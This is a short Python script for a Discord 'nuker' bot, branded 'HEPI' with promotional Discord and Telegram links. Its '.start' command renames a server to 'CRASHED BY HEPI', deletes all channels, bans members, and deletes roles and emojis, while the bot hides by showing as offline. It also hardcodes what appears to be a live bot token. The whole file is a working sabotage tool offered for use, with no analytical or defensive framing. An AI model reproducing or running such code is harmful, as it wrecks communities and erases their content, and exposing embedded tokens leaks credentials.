import discord, os, sys, random, string, requests
from discord.ext import commands
from discord import Permissions

def clear():
  if os.sys.platform == "win32":
    os.system("cls")
  else:
    os.system("clear")

client = commands.Bot(command_prefix='.')
@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.offline)

clear()
print(""" __    __   _______ .______    __  
|  |  |  | |   ____||   _  \  |  | 
|  |__|  | |  |__   |  |_)  | |  | 
|   __   | |   __|  |   ___/  |  | 
|  |  |  | |  |____ |  |      |  | 
|__|  |__| |_______|| _|      |__| 
                                   """)
print("Discord: https://discord.com/invite/ZmheYFnUsb\nTelegram: https://t.me/termuxpalace")

@client.command()
async def start(ctx):
  await ctx.guild.edit(name='CRASHED BY HEPI')
  for channel in ctx.guild.channels:
    await channel.delete()
  ban = 0
  for member in ctx.guild.member:
    try:
      ban += 1
      await member.ban()
    except:
      continue
  roles = ctx.guild.roles
  roles.pop(0)
  for role in roles:
    if ctx.guild.me.roles[-1] > role:
      await role.delete()
    else:
      break
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
    except:
      pass
try:
  client.run('ODIwNjY4NjIzMzYxNjcxMTg5.YE4hNw.VNvwY_3tqndMFt-VS33je8B-cyA')
except Exception:
  pass
